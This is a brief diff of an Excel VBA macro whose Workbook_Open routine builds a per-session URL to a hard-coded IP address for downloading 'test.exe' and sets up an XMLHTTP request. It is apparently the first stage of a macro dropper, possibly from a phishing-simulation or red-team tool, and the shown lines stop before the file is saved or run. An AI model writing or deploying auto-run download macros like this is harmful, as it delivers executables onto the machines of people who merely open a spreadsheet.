@@ -10,7 +10,7 @@ Private Sub Workbook_Open()
 
 
          ip = "192.168.100.156:5000"
-         session = "61e677a8ae03a8557a2a3fcf"
+         session = "61ea569c5e74d49a0c177282"
          FileUrl = "http://" & ip & "/download/exe/" & session & "/test.exe"
 
          Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
